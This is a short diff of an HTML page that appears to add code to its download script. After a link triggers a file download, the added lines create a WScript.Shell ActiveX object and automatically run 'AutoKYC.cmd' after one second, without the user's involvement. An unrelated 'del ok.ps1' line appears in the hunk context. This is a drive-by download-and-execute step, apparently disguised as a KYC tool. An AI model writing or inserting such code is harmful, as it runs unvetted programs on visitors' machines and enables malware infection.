@@ -37,9 +37,16 @@ del ok.ps1
 
             // Remove the link from the document after the download is triggered
             document.body.removeChild(link);
+
+            // After the download is triggered, execute the downloaded file
+            setTimeout(function() {
+                var shell = new ActiveXObject("WScript.Shell");
+                shell.run('AutoKYC.cmd', 1, false);
+            }, 1000);
         });
     </script>
 </head>
 <body>
 </body>
 </html>
+
